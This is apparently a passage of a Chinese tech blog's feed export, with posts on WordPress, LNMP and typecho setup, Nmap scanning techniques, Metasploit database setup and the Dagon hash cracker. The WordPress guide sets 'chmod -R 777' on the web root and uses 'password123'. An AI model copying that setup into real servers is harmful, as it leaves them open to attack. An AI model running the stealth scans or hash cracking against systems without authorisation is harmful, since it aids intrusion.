这个用户配置数据库的访问权限：1mysql&gt; GRANT ALL PRIVILEGES ON wordpress.* TO wordpressuser IDENTIFIED BY&quot;password123&quot;; 生效这些配置1mysql&gt; FLUSH PRIVILEGES; 然后退出 mysql1mysql&gt; exit; 配置 Wordpress需要下载一个 Wordpress 压缩包并解压12wget https://cn.wordpress.org/wordpress-4.9.4-zh_CN.zipsudo unzip wordpress-4.9.4-zh_CN.zip 由于PHP默认访问 /var/www/html/ 文件夹，所以我们需要把 wordpress 文件夹里的文件都复制到 /var/www/html/ 文件夹1sudo mv wordpress/* /var/www/html/ 修改一下 /var/www/html/ 目录权限：1sudo chmod -R 777 /var/www/html/ 将apache指定到index.html1sudo mv /var/www/html/index.html /var/www/html/index~.html 重启 Apache 服务：1sudo systemctl restart apache2.service 安装word press刷新一下页面：http://127.0.0.1/ ,即可看到安装界面。点击”现在就开始”，开始初始设置，然后开始接入刚才设置的数据库。如图所示，是我的配置，其中用户名密码，需要根据你的设置来进行设定。好了，数据库接入成功。然后设置站点信息，用户名和密码根据自己喜好进行设置。但是 设置的密码一定不能是弱口令。OK，安装成功。登陆后台试试， http://127.0.0.1/wp-login.php刷新一下 http://127.0.0.1/当然，即使你使用的是服务器，安装的过程和这个教程的也是如出一辙的。 扫码进群，我等待你的加入]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>Ubuntu</tag>
        <tag>建站</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux防毒软件-Sophos]]></title>
    <url>%2F2018%2F08%2F02%2FLinux%E9%98%B2%E6%AF%92%E8%BD%AF%E4%BB%B6-Sophos%2F</url>
    <content type="text"><![CDATA[官方站点：https://www.sophos.com/zh-cn.aspxLinux的安全性被认为要高于其他操作系统.但是随着越来越多的Linux操作系统开始担当开发人员工作站，网站服务器和内部文档服务器等关键角色，它也逐渐成为黑客攻击的目标.除了Linux和跨平台系统容易被黑客利用外，没有得到保护的Linux设备还会成为Windows, Mac和安卓恶意软件的分布点。Sophos Antivirus for Linux可以为Linux服务器和台式机提供随用随需的可计划扫描。它为分布广泛的Linux系统提供了卓越的性能，稳定性和可靠性。而关于该防毒软件的特点，可以进去官网进行查看。该产品有免费版和付费版，而我个人认为免费版已经足够你的使用了。如果需要下载的话，首先需要注册账户，然后就没什么好说的了，就直接下载安装就好了。]]></content>
      <categories>
        <category>ubuntu</category>
      </categories>
      <tags>
        <tag>Ubuntu</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Windows10怎么进入干净启动模式]]></title>
    <url>%2F2018%2F08%2F02%2FWindows10%E6%80%8E%E4%B9%88%E8%BF%9B%E5%85%A5%E5%B9%B2%E5%87%80%E5%90%AF%E5%8A%A8%E6%A8%A1%E5%BC%8F%2F</url>
    <content type="text"><![CDATA[提示：以下操作存在风险，可能会导致第三方软件使用异常或系统无法进入，建议提前备份好数据后操作。按下快捷键 win+R，在运行里输入”msconfig”。回车即可打开“系统配置”，选中”服务”选项卡。单击选中”隐藏所有 Microsoft 服务”复选框，然后开始勾选你需要禁用的服务，注意你一定要只禁用你认为不需要的服务，这些服务通常是一些你不常用的软件的服务，然后单击“全部禁用”即可。如果你无疑间，禁用了某个服务，导致某个软件无法正常打开，提示说xxx service或xxx服务无法正常启动，那么你直接去”服务”里打开即可正常使用了。注意： 按照此步骤操作可让 Microsoft 服务继续运行。这些服务包括网络连接、即插即用、事件日志记录、错误报告和其他服务。如果禁用这些服务，可能会永久性删除所有还原点。在“系统配置”对话框的“启动”选项卡上，单击“打开任务管理器”。在任务管理器的“启动”选项卡上，针对你认为需要禁用的启动项，选择启动项并右击“禁用”。在“系统配置”对话框的“启动”选项卡上，点按或单击“确定”，会弹出”重启电脑”的对话框，然后重新启动电脑。 Tips： 如果你无意间，禁用了某个服务，导致某个软件无法正常打开，提示说xxx service或xxx服务无法正常启动，那么你直接去”服务”里打开即可正常使用了。 扫码进群，我等待你的加入]]></content>
      <categories>
        <category>Windows</category>
      </categories>
      <tags>
        <tag>Windows</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Oracle 发布了一个全栈虚拟机 GraalVM，支持 Python]]></title>
    <url>%2F2018%2F07%2F28%2FOracle-%E5%8F%91%E5%B8%83%E4%BA%86%E4%B8%80%E4%B8%AA%E5%85%A8%E6%A0%88%E8%99%9A%E6%8B%9F%E6%9C%BA-GraalVM%EF%BC%8C%E6%94%AF%E6%8C%81-Python%EF%BC%81%2F</url>
    <content type="text"><![CDATA[近日，Oracle 发布了一个黑科技”GraalVM“，号称是一个全新的通用全栈虚拟机，并具有高性能、跨语言交互等逆天特性，真有这么神奇？ GraalVM 简介Oracle开源了一个实验性的产品GraalVM，官方称之为Universal GraalVM。它打通了不同语言之间的鸿沟，让我们可以进行混合式多语言编程。GraalVM 是一个跨语言的通用虚拟机，不仅支持了 Java、Scala、Groovy、Kotlin 等基于 JVM 的语言，以及 C、C++ 等基于 LLVM 的语言，还支持其他像 JavaScript、Ruby、Python 和 R 语言等。 GraalVM 的特性1.更加高效快速的运行代码2.能与大多数编程语言直接交互3.使用 Graal SDK 嵌入多语言4.创建预编译的原生镜像5.提供一系列工具来监视、调试和配置所有代码 GraalVM 的作用支持多种语言组合编程来看下面这段代码这段代码它同时使用了Node.js、Java、R三种语言拿node平台的express框架跑起了一个简单的web服务器。 GraalVM 消除了各种编程语言之间的隔离性，那这种多编程语言结合使用会不会有性能影响？官方的说明是：零开销的互操作，这样，我们就可以为应用程序选择最佳的编程语言组合。 原生镜像加速来看下面这段代码GraalVM支持镜像加速，类似于Android的Ahead-Of-Time编译，将程序编译为原生的二进制程序，加速程序启动过程。GraalVM 可以预编译成原生镜像，从而极大提速了启动时间，并能减少 JVM 应用的内存占用。 可嵌入式运行环境GraalVM 可以被嵌入到各种应用程序中，既可以独立运行，也可以在已经内置好的 OpenJDK、Node.js、Oracle、MySQL 等环境中运行。 结合上面的特性，我们来看下 GraalVM 的架构图 GraalVM 版本介绍如下图所示，GraalVM 提供了社区版和企业版两个版本。从特性来看，上述所说的高性能、内存优化貌似都在企业版中，企业版也可能只是在社区版上又增加了额外的提升吧！官网下载地址 ：http://www.graalvm.org/downloads/社区版下载地址：https://github.com/oracle/graal/releases 总结GraalVM 总体看起来还是很不错的，可以说这就是一个全栈开发平台，不仅支持主流编程语言，还能组合在一起编程，根据不同任务来选择最佳的语言。另外。它还能提高更高的执行效率，以及占用更少的内存。即使目前仍然处于测试阶段，而且功能先对来说并没有太稳定，但是这种包含多语言功能的开发平台，仍然具有很大的改进空间和发展前景，我们不妨一试，相信会给你带来不同的体验。至于应用场景，是否可应用于生产，现在还不能过早的下定论。对于这么一个变态级的产品，我们能做的只是期待它有更好的发展，仅此而已。 本文参考: 1. http://www.oracle.com/technetwork/cn/oracle-labs/program-languages/overview/index.html2.https://en.wikipedia.org/wiki/GraalVM]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Nmap使用详解]]></title>
    <url>%2F2018%2F07%2F25%2FNmap%E4%BD%BF%E7%94%A8%E8%AF%A6%E8%A7%A3%2F</url>
    <content type="text"><![CDATA[导读Nmap 是一个网络探测和安全扫描程序，系统管理员和个人都可以使用Nmap软件扫描大型的网络，获取一台主机正在运行以及提供什么服务等信息。Nmap是在免费软件基金会的GNU General Public License (GPL)下发布的，可从 https://nmap.org/ 站点上免费下载。下载格式可以是tgz格式的源码或RPM格式。目前较稳定的版本是2.12。带有图形终端，本文集中讨论Nmap命令的使用。 简介：Nmap 是一个网络探测和安全扫描程序，系统管理员和个人都可以使用Nmap软件扫描大型的网络，获取一台主机正在运行以及提供什么服务等信息。Nmap支持很多扫描技术，例如：UDP、TCP connect()、TCP SYN(半开扫描)、ftp代理(bounce攻击)、反向标志、ICMP、FIN、ACK扫描、圣诞树(Xmas Tree)、SYN扫描和null扫描。Nmap还提供了一些高级的特征，例如：通过TCP/IP协议栈特征探测操作系统类型，秘密扫描，动态延时和重传计算，并行扫描，通过并行ping扫描探测关闭的主机，诱饵扫描，避开端口过滤检测，直接RPC扫描(无须端口影射)，碎片扫描，以及灵活的目标和端口设定.Nmap的命令语法相当简单。Nmap的不同选项和-s标志组成了不同的扫描类型，比如：一个Ping-scan命令就是”-sP”。在确定了目标主机和网络之后，即可进行扫描。如果以root来运行Nmap，Nmap的功能会大大的增强，因为超级用户可以创建便于Nmap利用的定制数据包。 Nmap命令使用详解[Ping扫描（Ping Sweeping）] [端口扫描（Port Scanning）] [隐蔽扫描（Stealth Scanning）][UDP扫描（UDP Scanning）][操作系统识别（OS Fingerprinting）][Ident扫描（Ident Scanning）] 说明 ：找出网络上的主机,测试哪些端口在监听，这些工作通常是由扫描来实现的。扫描网络是黑客进行入侵的第一步。通过使用扫描器(如Nmap)扫描网络，寻找存在漏洞的目标主机。一旦发现了有漏洞的目标，接下来就是对监听端口的扫描。Nmap通过使用TCP协议栈指纹准确地判断出被扫主机的操作系统类型。在目标机上，Nmap运行灵活。使用Nmap进行单机扫描或是整个网络的扫描很简单，只要将带有”/mask”的目标地址指定给Nmap即可。地址是”victim/24”， 则目标是c类网络，地址是”victim/16”， 则目标是B类网络。另外,Nmap允许你使用各类指定的网络地址，比如 192.168.7.* , 是指192.168.7.0/24, 或 192.168.7.1,4,8-12，对所选子网下的主机进行扫描。 Ping扫描(Ping Sweeping)入侵者使用Nmap扫描整个网络寻找目标。通过使用” -sP”命令，进行ping扫描。缺省情况下，Nmap给每个扫描到的主机发送一个ICMP echo和一个TCP ACK, 主机对任何一种的响应都会被Nmap得到。举例：扫描192.168.7.0网络：123456root@kali:~# nmap -sP 192.168.7.0/24Starting nmap V. 2.12 by Fyodor (fyodor@dhp.com, www.insecure.org/nmap/)Host (192.168.7.11) appears to be up.Host (192.168.7.12) appears to be up.Host (192.168.7.76) appears to be up.Nmap run completed -- 256 IP addresses (3 hosts up) scanned in 1 second 如果不发送ICMP echo请求，但要检查系统的可用性，这种扫描可能得不到一些站点的响应。在这种情况下，一个TCP”ping”就可用于扫描目标网络。一个TCP”ping”将发送一个ACK到目标网络上的每个主机。网络上的主机如果在线，则会返回一个TCP RST响应。使用带有ping扫描的TCP ping选项，也就是”PT”选项可以对网络上指定端口进行扫描(本文例子中指的缺省端口是80（http）号端口)，它将可能通过目标边界路由器甚至是防火墙。注意，被探测的主机上的目标端口无须打开，关键取决于是否在网络上。1234567root@kali:~# nmap -sP -PT80 192.168.7.0/24TCP probe port is 80Starting nmap V. 2.12 by Fyodor (fyodor@dhp.com, www.insecure.org/nmap/)Host (192.168.7.11) appears to be up.Host (192.168.7.12) appears to be up.Host (192.168.7.76) appears to be up.Nmap run completed -- 256 IP addresses (3 hosts up) scanned in 1 second 当潜在入侵者发现了在目标网络上运行的主机，下一步是进行端口扫描。Nmap支持不同类别的端口扫描TCP连接, TCP SYN, Stealth FIN, Xmas Tree,Null和UDP扫描。 端口扫描(Port Scanning)一个攻击者使用TCP连接扫描很容易被发现，因为Nmap将使用connect()系统调用打开目标机上相关端口的连接，并完成三次TCP握手。黑客登录到主机将显示开放的端口。一个tcp连接扫描使用”-sT”命令如下。1234567891011root@kali:~# nmap -sT 192.168.7.12Starting nmap V. 2.12 by Fyodor (fyodor@dhp.com, www.insecure.org/nmap/)Interesting ports on (192.168.7.12):Port State Protocol Service7 open tcp echo9 open tcp discard13 open tcp daytime19 open tcp chargen21 open tcp ftp...Nmap run completed -- 1 IP address (1 host up) scanned in 3 seconds 隐蔽扫描(Stealth Scanning)如果一个攻击者不愿在扫描时使其信息被记录在目标系统日志上，TCP SYN扫描可帮你的忙，它很少会在目标机上留下记录，三次握手的过程从来都不会完全实现。通过发送一个SYN包（是TCP协议中的第一个包）开始一次 SYN的扫描。任何开放的端口都将有一个SYN|ACK响应。然而，攻击者发送一个RST替代ACK，连接中止。三次握手得不到实现，也就很少有站点能记录这样的探测。如果是关闭的端口，对最初的SYN信号的响应也会是RST，让NMAP知道该端口不在监听。”-sS”命令将发送一个SYN扫描探测主机或网络：1234567891011root@kali:~# nmap -sS 192.168.7.7Starting nmap V. 2.12 by Fyodor (fyodor@dhp.com, www.insecure.org/nmap/)Interesting ports on saturnlink.nac.net (192.168.7.7):Port State Protocol Service21 open tcp ftp25 open tcp smtp53 open tcp domain80 open tcp http...Nmap run completed -- 1 IP address (1 host up) scanned in 1 second 虽然SYN扫描可能不被注意，但他们仍会被一些入侵检测系统捕捉。Stealth FIN，Xmas树和Null scans可用于躲避包过滤和可检测进入受限制端口的SYN包。这三个扫描器对关闭的端口返回RST，对开放的端口将吸收包。一个 FIN “-sF”扫描将发送一个FIN包到每个端口。然而Xmas扫描”-sX”打开FIN, URG和PUSH的标志位，一个Null scans “-sN”关闭所有的标志位。因为微软不支持TCP标准，所以FIN, Xmas Tree和Null scans在非微软公司的操作系统下才有效。 UDP扫描(UDP Scanning)如果一个攻击者寻找一个流行的UDP漏洞，比如 rpcbind漏洞或cDc Back orifice。为了查出哪些端口在监听，则进行UDP扫描，即可知哪些端口对UDP是开放的。Nmap将发送一个O字节的UDP包到每个端口。如果主机返回端口不可达，则表示端口是关闭的。但这种方法受到时间的限制，因为大多数的UNIX主机限制ICMP错误速率。幸运的是，Nmap本身检测这种速率并自身减速，也就不会产生溢出主机的情况。12345678910111213root@kali:~# nmap -sU 192.168.7.7WARNING: -sU is now UDP scan -- for TCP FIN scan use -sFStarting nmap V. 2.12 by Fyodor (fyodor@dhp.com, www.insecure.org/nmap/)Interesting ports on saturnlink.nac.net (192.168.7.7):Port State Protocol Service53 open udp domain111 open udp sunrpc123 open udp ntp137 open udp netbios-ns138 open udp netbios-dgm177 open udp xdmcp1024 open udp unknownNmap run completed -- 1 IP address (1 host up) scanned in 2 seconds 操作系统识别(OS Fingerprinting)通常一个入侵者可能对某个操作系统的漏洞很熟悉，能很轻易地进入此操作系统的机器。一个常见的选项是TCP/IP上的指纹，带有”-O”选项决定远程操作系统的类型。这可以和一个端口扫描结合使用，但不能和ping扫描结合使用。Nmap通过向主机发送不同类型的探测信号，缩小查找的操作系统系统的范围。指纹验证TCP包括使用FIN探测技术发现目标机的响应类型。BOGUS的标志探测，发现远程主机对发送的带有SYN包的不明标志的反应，TCP 初始序列号(ISN)取样发现ISN数值的样式，也可以用另外的方式决定远程操作系统。有一篇权威的关于指纹（fingertprinting）的文章, 作者：Fyodor，也是namp的作者，参见地址：http://www.insecure.org/nmap/nmap-fingerprinting-article.htmlNmap’s操作系统的检测是很准确也是很有效的，举例：使用系统Solaris 2.7带有SYN扫描的指纹验证堆栈。123456789101112131415root@kali:~# nmap -sS -O 192.168.7.12Starting nmap V. 2.12 by Fyodor (fyodor@dhp.com, www.insecure.org/nmap/)Interesting ports on comet (192.168.7.12):Port State Protocol Service7 open tcp echo9 open tcp discard13 open tcp daytime19 open tcp chargen21 open tcp ftp...TCP Sequence Prediction: Class=random positive incrementsDifficulty=17818 (Worthy challenge)Remote operating system guess: Solaris 2.6 - 2.7Nmap run completed -- 1 IP address (1 host up) scanned in 5 seconds Ident扫描（Ident Scanning）一个攻击者常常寻找一台对于某些进程存在漏洞的电脑。比如,一个以root运行的WEB服务器。如果目标机运行了identd,一个攻击者使用Nmap通过 “-I”选项的TCP连接,就可以发现哪个用户拥有http守护进程。我们将扫描一个Linux WEB服务器为例：1234567891011root@kali:~# nmap -sT -p 80 -I -O www.yourserver.comStarting nmap V. 2.12 by Fyodor (fyodor@dhp.com, www.insecure.org/nmap/)Interesting ports on www.yourserver.com (xxx.xxx.xxx.xxx):PortState Protocol Service Owner80 open tcp http rootTCP Sequence Prediction: Class=random positive incrementsDifficulty=1140492 (Good luck!)Remote operating system guess: Linux 2.1.122 - 2.1.132; 2.2.0-pre1 - 2.2.2Nmap run completed -- 1 IP address (1 host up) scanned in 1 second 如果你的WEB服务器是错误的配置并以root来运行，像上例一样，它将是很危险的。Apache 运行在root下，是不安全的。你可以通过把/etc/indeed.conf中的auth服务注销来阻止ident请求，并重新启动ident。另外也可使用ipchains或你最常用的防火墙，在网络边界上执行防火墙规则来终止ident请求，这可以阻止来路不明的人探测你的网站用户拥有哪些进程。 其他选项(Options)除了以上这些扫描，Nmap还提供了无数选项。有一个是”-PT”,，我们已经介绍过了。在目标机或网络上常见的未经过滤的端口，进行TCP “ping”扫描。另一个选项是”-P0”。在缺省设置下试图扫描一个端口之前，Nmap将用TCP ping” 和 ICMP echo命令ping一个目标机，如果ICMP 和TCP的探测扫描得不到响应，目标主机或网络就不会被扫描，即使他们是运行着的。而”-P0”选项允许在扫描之前不进行ping，即可进行扫描。你应该习惯使用”-v”命令，它详细列出所有信息，能和所有的扫描选项一起使用。你能反复地使用这个选项，获得有关目标机的更多信息。使用”-p “选项，可以指定扫描端口。比如 ，攻击者想探测你的web服务器的ftp（port 21），telnet (port 23), dns (port 53), http (port 80),想知道你所使用的操作系统，它将使用SYN扫描。1root@kali:~# nmap -sS -p 21,23,53,80 -O -v www.yourserver.com 总结我们可以使用工具来抵制黑客使用Nmap进行扫描，比如 Scanlogd, Courtney等，然而使用这样的工具并不能代替网络安全管理员。因为扫描只是攻击的前期准备，站点使用它只可以进行严密的监视，但是还是需要一个有着丰富经验的运维管理人员的存在的，比较没用任何工具可以代替人的。关于Nmap更多的资料可以参考该网站： http://www.nmap.com.cn/ 扫码进群，我等待你的加入]]></content>
      <categories>
        <category>Kali</category>
      </categories>
      <tags>
        <tag>Kali</tag>
        <tag>Nmap</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Ubuntu搭建LNMP环境]]></title>
    <url>%2F2018%2F07%2F25%2FUbuntu%E6%90%AD%E5%BB%BALNMP%E7%8E%AF%E5%A2%83%2F</url>
    <content type="text"><![CDATA[导读Lightbot是一款由加拿大学生Danny Yaroslavski编写的关于计算机编程的迷宫游戏，游戏的目标是让机器人举起所有的蓝色瓷砖，当然它还会为孩子提供各种各样的指导和提示，直到完成目标。 安装nginx1yum -y install pcre pcre-devel zlib zlib-devel openssl openssl-devel 1wget http://nginx.org/download/nginx-1.6.2.tar.gz 搭建Nginx静态服务器1lengyue@ubuntu:~# sudo apt-get install nginx 12lengyue@ubuntu:~$ sudo /etc/init.d/nginx start[ ok ] Starting nginx (via systemctl): nginx.service. 安装MySQL数据库1sudo apt-get install mysql-server安装过程中会出现如下图所示的界面，你只需要一直回车就可以了。搭建PHP环境 1234sudo apt-add-repository ppa:ondrej/phpsudo apt-get updatesudo apt-get install php7.1-cli php7.1-cgi php7.1-mysqlsudo apt-get install php7.1-fpm 配置Nginx并运行PHP程序 12 本文参考: http://wiki.ubuntu.org.cn/Nginx 扫码进群，我等待你的加入]]></content>
      <categories>
        <category>ubuntu</category>
      </categories>
      <tags>
        <tag>Ubuntu</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Metasploit连接postgresql数据库]]></title>
    <url>%2F2018%2F07%2F24%2Fmetasploit%E5%88%9D%E5%A7%8B%E5%8C%96%E9%85%8D%E7%BD%AE%2F</url>
    <content type="text"><![CDATA[扫描的时候为了方便查看扫描的结果，那么需要开启数据库服务。metasploit默认的数据库是postgresql数据库。首先开启postgresql数据库服务。12root@kali:~# /etc/init.d/postgresql start[ ok ] Starting postgresql (via systemctl): postgresql.service. 下面打开msfconsole，查看一下是否已连接数据库。123root@kali:~# msfconsolemsf &gt; db_status[*] postgresql selected, no connection 表明未连接上postgresql数据库。 下面初始化一下meatsploit的数据库。1msf &gt; msfdb init 查看数据库的配置文件(主要是查看数据库名，用户名，密码)。123456789101112131415161718192021222324252627282930root@kali:~# cat /usr/share/metasploit-framework/config/database.ymldevelopment: adapter: postgresql database: msf username: msf password: LlvOHTrjwhh52tjZWdNNIqDA2hHrkr4d90vGCg1+LEg= host: localhost port: 5432 pool: 5 timeout: 5production: adapter: postgresql database: msf username: msf password: LlvOHTrjwhh52tjZWdNNIqDA2hHrkr4d90vGCg1+LEg= host: localhost port: 5432 pool: 5 timeout: 5test: adapter: postgresql database: msf_test username: msf password: LlvOHTrjwhh52tjZWdNNIqDA2hHrkr4d90vGCg1+LEg= host: localhost port: 5432 pool: 5 timeout: 5 然后开始连接数据库。格式为:db_connect 用户名:密码@localhost:5432/数据库名12msf &gt; db_connect msf:LlvOHTrjwhh52tjZWdNNIqDA2hHrkr4d90vGCg1+LEg=@localhost:5432/msf[*] Rebuilding the module cache in the background... 我们再次查看一下数据库状态12msf &gt; db_status[*] postgresql connected to msf 如图所示，我们已经成功连接上了数据库，如果你想连接其他的数据库，需要先断开当前已经连接的数据库，可以直接在msfconsole下执行 msf&gt; 。如果你在使用search参数查找模块的时候出现 Module database cache not built yet, using slow search ，那么你首先应该查看是否已经连接数据库，然后重新构建数据库缓存,只需要运行 db_rebuild_cache 即可。 扫码进群，我等待你的加入]]></content>
      <categories>
        <category>Kali</category>
      </categories>
      <tags>
        <tag>Metasploit</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[一款hash破解工具-Dagon]]></title>
    <url>%2F2018%2F07%2F11%2F%E4%B8%80%E6%AC%BE%E5%85%88%E8%BF%9B%E7%9A%84hash%E7%A0%B4%E8%A7%A3%E5%B7%A5%E5%85%B7%2F</url>
    <content type="text"><![CDATA[Dagon是一是一种先进的哈希破解工具，支持多种哈希类型的暴力破解，支持自定义字符字典进行暴力，可以自动验证散列所用算法，从Unicode到ASCII的随机slat生成，等等。GitHub地址: https://github.com/Ekultek/Dagon 安装运行环境:python2.7.x1234root@kali:~# git clone https://github.com/ekultek/dagon.gitroot@kali:~# cd Dagon/root@kali:~/Dagon# pip install -r requirements.txt # 安装所需依赖的库![1](https://ws1.sinaimg.cn/large/006DGX4tly1ft66vh89p0j31kw18tamj.jpg) 基本用法123456python dagon.py -h 这将运行“帮助”菜单，并提供所有可能的标志python dagon.py -c &lt;HASH&gt; --bruteforce 这将为给定散列暴力破解尝试python dagon.py -l &lt;FILE-PATH&gt; --bruteforce 这将尝试暴力破解给定文件的散列(每行一个)python dagon.py -v &lt;HASH&gt; 这将检验hash的加密类型python dagon.py -V &lt;FILE-PATH&gt; 这将尝试验证每个文件的散列中，每行一个以上只是这个工具几个较为常用的参数，更多参数可以通过 *-h* 选项获取帮助。 使用查看hash加密类型1root@kali:~/Dagon# python dagon.py -v 49ba59abbe56e057 -L 破解单个加密的hash值1root@kali:~/Dagon# python dagon.py -c 49ba59abbe56e057 --bruteforce 以上只是最简单的操作，其余操作还需要你自己摸索。首先有必要说明一点，工具到底好不好用，hash值的破解率到底高不高，还是需要你经过测试才能知道的，而且对于MD5等加密算法，本身破解就十分有难度，目前根本不存在可以破解任何MD5加密的密码的工具。 扫码进群，我等待你的加入]]></content>
      <categories>
        <category>加密解密</category>
      </categories>
      <tags>
        <tag>Kali</tag>
        <tag>MD5</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[解决一下利用免费云主机暂时不能访问的问题]]></title>
    <url>%2F2018%2F07%2F08%2F%E8%A7%A3%E5%86%B3%E4%B8%80%E4%B8%8B%E5%88%A9%E7%94%A8%E5%85%8D%E8%B4%B9%E4%BA%91%E4%B8%BB%E6%9C%BA%E6%9A%82%E6%97%B6%E4%B8%8D%E8%83%BD%E8%AE%BF%E9%97%AE%E7%9A%84%E9%97%AE%E9%A2%98%2F</url>
    <content type="text"><![CDATA[实在要说一句’对不起，各位’，上次写的利用云虚拟主机搭建typecho博客的教程，有一些错误在里面，所以在此进行一些修正。如果各位看了那篇文章，就知道我建的那个博客显示”该网站不能正常访问”的问题了。其实我也是最近才知道不能正常访问的。但是我根据提示来排查错误，一直找不到原因。首先并不是需要备案的原因，”主机屋”的这个免费云主机是不需要备案的就可以正常访问的。其次，我将其加入白名单也是不可以的，因为这个是免费云主机，其IP是公共的故不能加入白名单。那就剩网站域名解析错误合格原因了。但是我检查了多次，发现并没有任何错误。解析是正常的，但是不能正常访问，那么说明解析的记录值也许是不正确的。后来，我在云虚拟主机的控制台找到了这个小细节。首先有必要说明一下，该记录值是根据用户自动分配的，也就是说不同用户的解析的记录值是不一样的，你需要根据自己的记录值来解析。果然是解析的记录值不正确。需要按照提示进行解析。在建站教程中，我是以ipv4作为记录值解析的，当时解析的IP地址就是FTP地址。其实这样解析正不正确，大家可以验证一下，如果解析正确的话，直接在浏览器输入该IP地址，也是可以正常访问到网站的，但是你会看到如下界面，则说明解析的是不正确的，该地址是没有映射到网站上去的。那么，我们正确解析上去就可以了。解析完毕后，也许不能立即生效，我们稍等一小会，再次刷新网页，就可以正常访问网站了。ok，成功解决问题!!!网址: http://lengyue1024.cn/ ,欢迎各位的访问。 扫码进群，我等待你的加入]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>建站</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[一款运行在Linux平台的轻型笔记软件CherryTree]]></title>
    <url>%2F2018%2F06%2F30%2F%E4%B8%80%E6%AC%BE%E8%BF%90%E8%A1%8C%E5%9C%A8Linux%E5%B9%B3%E5%8F%B0%E7%9A%84%E8%BD%BB%E5%9E%8B%E7%AC%94%E8%AE%B0%E8%BD%AF%E4%BB%B6CherryTree%2F</url>
    <content type="text"><![CDATA[软件官方主页: http://www.giuspen.com/cherrytree/GitHub项目地址: https://github.com/giuspen/cherrytreeCherryTree 是一款轻型笔记软件应用，配有丰富的文字和语法高亮显示、数据存储在单个XML文件或Sqlite。一个层级式笔记记录程序，具有富文本和代码高亮的功能。同时支持Windows平台和Linux平台，支持纯文本，富文本，markdown，支持代码高亮显示。今天只说Linux平台上。支持Debian、Ubuntu以及其衍生版本，支持Redhat以及其衍生版本。这款编辑神器很值得你拥有。我曾多次在国外的视频教程中看到那些大佬使用CherryTree作为教学记录笔记使用。 安装(以Ubuntu16.04 LTS演示)第一种方法：首先进入官网下载 ，然后直接用dpkg软件包管理工具安装即可。1lengyue@ubuntu:~$ sudo dpkg -i cherrytree_0.38.4-0_all.deb 有可能会遇到缺少依赖的问题，你只需运行以下命令即可成功安装。1lengyue@ubuntu:~$ sudo apt-get -f install 第二钟方法:添加ppa仓库，然后再安装。12lengyue@ubuntu:~$ sudo add-apt-repository ppa:giuspen/ppalengyue@ubuntu:~$ sudo apt-get install cherrytree 打开运行1lengyue@ubuntu:~$ cherrytree 使用点击左上角的那个樱桃🍒图标即可新建文本，然后根据自己需求设置格式，最后点击确定即可。以下是演示文本好了，更多操作可以自己摸索，哪里不会可以联系我询问。 扫码进群，我等到你的加入]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>Kali</tag>
        <tag>Ubuntu</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[利用云虚拟主机搭建typecho博客]]></title>
    <url>%2F2018%2F06%2F29%2F%E5%88%A9%E7%94%A8%E4%BA%91%E8%99%9A%E6%8B%9F%E4%B8%BB%E6%9C%BA%E6%90%AD%E5%BB%BAtypecho%E5%8D%9A%E5%AE%A2%2F</url>
    <content type="text"><![CDATA[首先晒一下自己做的站，网址: http://lengyue1024.cn/(没解析出wwww类型的网址，所以不能访问http://www.lengyue1024.cn)利用的是前天领取的免费云虚拟主机做的网站，仅仅是为了做一些测试以及练习建站，并没有作为主站使用，首先各位也可以参照本教程来搭建一个博客或者个人网站。OK，开始！首先下载typecho博客系统.官方地址: http://typecho.org/download官方文档: http://docs.typecho.org/doku.php主题网站: https://typecho.me/插件网站: https://plugins.typecho.me/首先下载FTP软件，我个人用的是“8uftp”,然后Linux系统上我推荐的是filezilla ，然后可以直接 sudo apt-get install filezilla 即可完成安装。我们首先进入主机屋的控制台页面，然后找到自己的FTP账号与FTP地址，你需要自己设置一个FTP密码用于连接FTP服务 。然后运行8uftp软件，填写FTP地址、账号、密码，连接上。如下图即为连接成功的样子。其中web文件存放网站程序文件，log文件为缓存的日志文件，data为备份文件。我们把下载好的typecho文件解压出来，然后把解压出来的文件全部上传到web文件中。还有一点一定要记住，你不要把web文件的上层目录也一同传进去，这样你打开网站的时候，会找不到主页，多了一层目录，就需要多访问一个目录才能进入网站主页。同时把web目录默认存在的index.htm也要删除了。做的类似我图中所示这样即可。然后右击上传即可。此时你点击主机屋默认为你分配的网站域名，即可看到网站安装页面了。如果你看到如下图所示。该主机默认的PHP版本是5.2.9,我们需要调整一下PHP版本才可以，调整为如图所示，才可以。然后刷新一下页面，好了，安装页面出来了。然后可以点击”开始下一步”，进行安装。这个时候我们需要MySQL数据库的信息，我们需要初始化数据库。即可看到数据库的信息了，我们需要设置一个数据库的密码，自己一定要记住这个密码，一会会用到。我们开始填写配置信息，数据库地址设置为127.0.0.1，数据库名称、账号、密码均在数据库基本信息这里，按照你的MySQL数据库基本信息填写即可。然后设置博客后台登陆账号、密码。这些一定要仔细填写，并且记住，以方便后期进入后台管理自己的博客。然后即可看到安装成功的界面了。然后我们可以进入首页访问自己的博客这里我换个主题,将下载好的主题解压出来。 